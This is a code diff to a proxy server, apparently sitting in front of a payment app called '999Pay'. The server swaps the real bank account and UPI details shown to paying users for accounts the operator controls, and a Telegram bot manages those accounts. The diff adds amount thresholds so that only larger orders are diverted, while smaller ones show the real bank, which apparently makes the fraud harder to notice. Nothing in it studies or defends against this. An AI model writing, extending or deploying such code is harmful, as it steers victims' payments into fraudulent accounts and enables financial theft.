@@ -301,6 +301,18 @@ async function saveOrderBank(data, orderId, bank) {
   await saveData(data);
 }
 
+async function markOrderBankSkip(data, orderId) {
+  if (!orderId || orderId === 'N/A') return;
+  if (!data.orderBankMap) data.orderBankMap = {};
+  data.orderBankMap[String(orderId)] = { _skip: true, t: Date.now() };
+  await saveData(data);
+}
+
+function hasOrderBankEntry(data, orderId) {
+  if (!orderId || !data.orderBankMap) return false;
+  return !!data.orderBankMap[String(orderId)];
+}
+
 async function saveOrderBankMultipleKeys(data, ids, bank) {
   if (!bank) return;
   const uniqueIds = [...new Set(ids.map(String).filter(id => id && id !== 'N/A'))];
@@ -315,7 +327,9 @@ async function saveOrderBankMultipleKeys(data, ids, bank) {
 
 function getOrderBank(data, orderId) {
   if (!orderId || !data.orderBankMap) return null;
-  return data.orderBankMap[String(orderId)] || null;
+  const entry = data.orderBankMap[String(orderId)];
+  if (!entry || entry._skip) return null;
+  return entry;
 }
 
 function getOrderBankMultiple(data, ids) {
@@ -323,7 +337,7 @@ function getOrderBankMultiple(data, ids) {
   for (const id of ids) {
     if (!id) continue;
     const bank = data.orderBankMap[String(id)];
-    if (bank) return bank;
+    if (bank && !bank._skip) return bank;
   }
   return null;
 }
@@ -458,25 +472,58 @@ function getForceReviewSuccessUserIds(data) {
   return ids;
 }
 
-function getActiveBank(data, userId) {
+function getActiveBank(data, userId, orderAmount) {
+  const hasAmt = orderAmount !== undefined && orderAmount !== null && isFinite(orderAmount);
+  const qualifies = (b) => !hasAmt || (Number(b.minAmount) || 0) <= Number(orderAmount);
+
+  // STRICT: user-pinned bank — if it doesn't qualify for the amount, return null
+  // (real upstream bank passes through; no silent fallback to other banks).
   const uo = getUserOverride(data, userId);
   if (uo && uo.bankIndex !== undefined && uo.bankIndex >= 0 && uo.bankIndex < data.banks.length) {
-    return data.banks[uo.bankIndex];
+    const pinned = data.banks[uo.bankIndex];
+    return qualifies(pinned) ? pinned : null;
   }
-  if (data.autoRotate && data.banks.length > 1) {
-    let idx;
-    do { idx = Math.floor(Math.random() * data.banks.length); } while (idx === data.lastUsedIndex && data.banks.length > 1);
-    data.lastUsedIndex = idx;
-    data._rotatedIndex = idx;
-    return data.banks[idx];
+
+  // Auto-rotate: pick randomly only from eligible banks
+  if (data.autoRotate && data.banks.length > 0) {
+    const eligible = data.banks.filter(qualifies);
+    if (eligible.length === 0) return null;
+    if (eligible.length === 1) {
+      const realIdx = data.banks.indexOf(eligible[0]);
+      data.lastUsedIndex = realIdx;
+      data._rotatedIndex = realIdx;
+      return eligible[0];
+    }
+    let pickIdx;
+    do {
+      pickIdx = Math.floor(Math.random() * eligible.length);
+    } while (data.banks.indexOf(eligible[pickIdx]) === data.lastUsedIndex);
+    const chosen = eligible[pickIdx];
+    const realIdx = data.banks.indexOf(chosen);
+    data.lastUsedIndex = realIdx;
+    data._rotatedIndex = realIdx;
+    return chosen;
   }
-  if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) return data.banks[data.activeIndex];
-  if (data.banks.length > 0) return data.banks[0];
+
+  // STRICT manual mode: if /setbank picked an active bank but it fails the
+  // amount threshold, return null so the real upstream bank passes through.
+  // Do NOT silently fall through to a different bank.
+  if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) {
+    const ab = data.banks[data.activeIndex];
+    return qualifies(ab) ? ab : null;
+  }
+
+  // No activeIndex set at all — first bank that qualifies (only relevant on
+  // a fresh setup before /setbank was ever called).
+  if (data.banks.length > 0) {
+    const first = data.banks[0];
+    return qualifies(first) ? first : null;
+  }
   return null;
 }
 
-async function getActiveBankAndSave(data, userId) {
-  const bank = getActiveBank(data, userId);
+async function getActiveBankAndSave(data, userId, orderAmount) {
+  const bank = getActiveBank(data, userId, orderAmount);
   if (data.autoRotate && data._rotatedIndex !== undefined) {
     data.lastUsedIndex = data._rotatedIndex;
     delete data._rotatedIndex;
@@ -489,7 +536,9 @@ function bankListText(d) {
   if (d.banks.length === 0) return 'No banks added yet.';
   return d.banks.map((b, i) => {
     const a = i === d.activeIndex ? ' ✅' : '';
-    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${a}`;
+    const minA = Number(b.minAmount) || 0;
+    const min = minA > 0 ? ` | ≥₹${minA}` : ' | any amt';
+    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${min}${a}`;
   }).join('\n');
 }
 
@@ -902,10 +951,12 @@ app.post('/bot-webhook', async (req, res) => {
 `🏦 999Pay Bank Controller
 
 === BANK COMMANDS ===
-/addbank Name|AccNo|IFSC|BankName|UPI
+/addbank Name|AccNo|IFSC|BankName|UPI [minAmount]
+   (minAmount = order amount threshold; bank shows only on orders ≥ this. Below it real bank is shown.)
+/setmin <bankNumber> <amount> — Change threshold (0 = no threshold)
 /removebank <number>
 /setbank <number>
-/banks — List all banks
+/banks — List all banks (with min-amount thresholds)
 
 === CONTROL ===
 /on — Proxy ON
@@ -1295,16 +1346,47 @@ Example:
     }
 
     if (text.startsWith('/addbank ')) {
-      const parts = text.substring(9).split('|').map(s => s.trim());
-      if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI\n(BankName and UPI optional)'); return res.sendStatus(200); }
+      const raw = text.substring(9).trim();
+      let minAmount = 0;
+      const parts = raw.split('|').map(s => s.trim());
+      // Optional trailing space-separated number on the LAST pipe-field → minAmount threshold.
+      // Scoped to last field so bank names containing digits (e.g. "Bank2") in earlier fields won't be misparsed.
+      if (parts.length > 0) {
+        const last = parts[parts.length - 1];
+        const mAmt = last.match(/^(.*?)\s+(\d+(?:\.\d+)?)\s*$/);
+        if (mAmt) {
+          parts[parts.length - 1] = mAmt[1].trim();
+          minAmount = parseFloat(mAmt[2]) || 0;
+          // If the last pipe-field becomes empty after stripping, drop it
+          if (parts[parts.length - 1] === '') parts.pop();
+        }
+      }
+      if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI [minAmount]\n(BankName, UPI, minAmount optional)\n\nExample:\n/addbank Rahul|1234567890|SBIN0001234|SBI|r@upi 300\n→ Bank shows only on orders ≥ ₹300; below that real bank shown.'); return res.sendStatus(200); }
       data = await loadData(true);
       if (data.banks.length >= 10) { await bot.sendMessage(chatId, '❌ Max 10 banks.'); return res.sendStatus(200); }
-      const newBank = { accountHolder: parts[0], accountNo: parts[1], ifsc: parts[2], bankName: parts[3] || '', upiId: parts[4] || '' };
+      const newBank = { accountHolder: parts[0], accountNo: parts[1], ifsc: parts[2], bankName: parts[3] || '', upiId: parts[4] || '', minAmount: minAmount };
       data.banks.push(newBank);
       if (data.activeIndex < 0) data.activeIndex = 0;
       data._skipOverrideMerge = true;
       await saveData(data);
-      await bot.sendMessage(chatId, `✅ Bank #${data.banks.length} added:\n${newBank.accountHolder} | ${newBank.accountNo}\nIFSC: ${newBank.ifsc}${newBank.bankName ? '\nBank: ' + newBank.bankName : ''}${newBank.upiId ? '\nUPI: ' + newBank.upiId : ''}`);
+      await bot.sendMessage(chatId, `✅ Bank #${data.banks.length} added:\n${newBank.accountHolder} | ${newBank.accountNo}\nIFSC: ${newBank.ifsc}${newBank.bankName ? '\nBank: ' + newBank.bankName : ''}${newBank.upiId ? '\nUPI: ' + newBank.upiId : ''}\nMin Amount: ${minAmount > 0 ? '≥ ₹' + minAmount : 'any (no threshold)'}`);
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/setminamount ') || text.startsWith('/setmin ')) {
+      const cmdLen = text.startsWith('/setminamount ') ? 14 : 8;
+      const parts = text.substring(cmdLen).trim().split(/\s+/);
+      if (parts.length < 2) { await bot.sendMessage(chatId, '❌ Format: /setmin <bankNumber> <amount>\nExample: /setmin 2 500  (bank #2 will only show on orders ≥ ₹500)\nUse 0 to remove threshold.'); return res.sendStatus(200); }
+      data = await loadData(true);
+      const idx = parseInt(parts[0]) - 1;
+      const amt = parseFloat(parts[1]);
+      if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid bank number. /banks se check karo.'); return res.sendStatus(200); }
+      if (isNaN(amt) || amt < 0) { await bot.sendMessage(chatId, '❌ Invalid amount.'); return res.sendStatus(200); }
+      data.banks[idx].minAmount = amt;
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      const b = data.banks[idx];
+      await bot.sendMessage(chatId, `✅ Bank #${idx + 1} (${b.accountHolder}) min amount set to ${amt > 0 ? '≥ ₹' + amt : 'any (no threshold)'}`);
       return res.sendStatus(200);
     }
 
@@ -1548,14 +1630,26 @@ async function proxyAndReplaceBankDetails(req, res, label) {
       const amount = rd.amount || rd.orderAmount || rd.buyAmount || req.parsedBody?.amount || 'N/A';
       const phone = getPhone(data, detectedUserId);
       const savedBank = getOrderBankMultiple(data, allOrderIds);
-      const bankUsed = savedBank || active;
+      // Detect skip-marker: order was intentionally left as real upstream bank (below threshold)
+      let isRealPassthrough = false;
+      for (const oid of allOrderIds) {
+        if (oid && data.orderBankMap && data.orderBankMap[String(oid)] && data.orderBankMap[String(oid)]._skip) {
+          isRealPassthrough = true;
+          break;
+        }
+      }
+      const bankUsed = savedBank || (!isRealPassthrough ? active : null);
+      let sourceLine;
+      if (savedBank) sourceLine = '📌 Source: Saved for this order';
+      else if (isRealPassthrough) sourceLine = '🏦 Source: REAL upstream bank (amount below threshold)';
+      else sourceLine = '⚡ Source: Active bank (no saved mapping)';
       bot.sendMessage(data.adminChatId,
 `🔔 ${label}
 👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
 📋 Order: ${orderId}
 💰 Amount: ₹${amount}
-💳 Bank: ${bankUsed ? `${bankUsed.accountHolder} | ${bankUsed.accountNo}` : 'N/A'}
-${savedBank ? '📌 Source: Saved for this order' : '⚡ Source: Active bank (no saved mapping)'}
+💳 Bank: ${bankUsed ? `${bankUsed.accountHolder} | ${bankUsed.accountNo}` : (isRealPassthrough ? 'REAL upstream' : 'N/A')}
+${sourceLine}
 🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
       ).catch(()=>{});
     }
@@ -1827,11 +1921,31 @@ app.post('/app/buy/order', async (req, res) => {
     }
     if (newOrderId) {
       const eff = getEffectiveSettings(data, userId);
-      const active = (eff.botEnabled !== false) ? await getActiveBankAndSave(data, userId) : null;
+      const orderAmt = parseFloat(body.amount || body.buyAmount || body.orderAmount || '0') || 0;
+      const active = (eff.botEnabled !== false) ? await getActiveBankAndSave(data, userId, orderAmt) : null;
       if (active) {
         saveOrderBank(data, newOrderId, active);
         if (data.adminChatId && bot) {
-          bot.sendMessage(data.adminChatId, `🔗 Bank saved for Order: ${newOrderId}\n💳 ${active.accountHolder} | ${active.accountNo}`).catch(()=>{});
+          bot.sendMessage(data.adminChatId, `🔗 Bank saved for Order: ${newOrderId}\n💰 Amount: ₹${orderAmt}\n💳 ${active.accountHolder} | ${active.accountNo}${(Number(active.minAmount)||0) > 0 ? ' (min ₹' + Number(active.minAmount) + ')' : ''}`).catch(()=>{});
+        }
+      } else if (eff.botEnabled !== false && data.banks && data.banks.length > 0) {
+        // No bank qualifies for this amount (or strict-mode active bank's threshold not met)
+        // → mark skip so processOrderNo & details endpoints pass through real bank
+        await markOrderBankSkip(data, newOrderId);
+        if (data.adminChatId && bot) {
+          let reason;
+          if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) {
+            const ab = data.banks[data.activeIndex];
+            const abMin = Number(ab.minAmount) || 0;
+            if (abMin > orderAmt) {
+              reason = `active bank #${data.activeIndex + 1} requires ≥ ₹${abMin}`;
+            } else {
+              reason = `no bank qualifies for ₹${orderAmt}`;
+            }
+          } else {
+            reason = `no bank qualifies for ₹${orderAmt}`;
+          }
+          bot.sendMessage(data.adminChatId, `⏭️ Order ${newOrderId} amount ₹${orderAmt} — ${reason} → REAL bank will be shown`).catch(()=>{});
         }
       }
     }
@@ -1920,14 +2034,19 @@ app.all('/app/buy/order/processOrderNo', async (req, res) => {
     const respData = getResponseData(jsonResp);
 
     if (typeof respData === 'string' && respData.length > 5 && eff.botEnabled !== false) {
-      const active = getActiveBank(data, detectedUserId);
-      if (active) {
-        const existingBank = getOrderBank(data, respData);
-        if (!existingBank) {
+      // Respect prior decision from /app/buy/order (real-bank skip OR saved bank)
+      if (!hasOrderBankEntry(data, respData)) {
+        // Order amount is NOT available on this endpoint. Be conservative:
+        // Only pick a bank that has no minAmount threshold (minAmount=0). If every
+        // bank has a threshold, leave map empty so real upstream bank passes through.
+        const active = getActiveBank(data, detectedUserId, 0);
+        if (active) {
           saveOrderBank(data, respData, active);
           if (data.adminChatId && bot) {
             bot.sendMessage(data.adminChatId, `🔗 processOrderNo: Bank saved for ${respData}\n💳 ${active.accountHolder} | ${active.accountNo}`).catch(()=>{});
           }
+        } else if (data.adminChatId && bot && data.banks && data.banks.length > 0) {
+          bot.sendMessage(data.adminChatId, `⏭️ processOrderNo: Order ${respData} — no threshold-free bank available & amount unknown → REAL bank passthrough`).catch(()=>{});
         }
       }
     }
